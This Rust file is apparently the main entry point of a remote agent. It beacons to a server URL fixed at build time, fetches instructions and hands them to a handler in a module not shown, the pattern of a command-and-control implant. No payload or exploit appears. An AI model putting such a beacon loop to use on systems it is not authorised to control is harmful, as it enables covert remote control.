pub mod agent;
pub mod harpe;
pub mod network;

use agent::AgentContext;
use std::time::Duration;
use talaria::helper::*;
use tokio::time::sleep;

const URL: &'static str = env!("URL", "environment variable `URL` not defined");

const POLL_INTERVAL_MS: &'static str = env!(
    "POLL_INTERVAL_MS",
    "environment variable `POLL_INTERVAL_MS not defined"
);

#[tokio::main]
async fn main() {
    let mut agent = AgentContext::new(
        URL,
        POLL_INTERVAL_MS.parse().expect("Invalid Polling Interval"),
    );

    loop {
        match network::send_heartbeat(&mut agent).await {
            Ok(instruction) => {
                devlog!("Got instruction: {:#?}", instruction);
                match network::handle_response(&mut agent, instruction).await {
                    Ok(_) => devlog!("Successfully handled response"),
                    Err(err) => devlog!("Failed to handle response\n{:?}", err),
                }
            }
            Err(err) => devlog!("Failed to communicate with server\n{:?}", err),
        }

        // FIXME: whoever wrote this does not understand the nature of async code (me [cole])
        // we are waiting X amount of time from the end of the last execution,
        // meaning if we intend to call function Y every X seconds, we are actually
        // calling function Y every X + N seconds, where N is the execution time of Y
        sleep(Duration::from_millis(agent.polling_interval_millis)).await;
    }
}
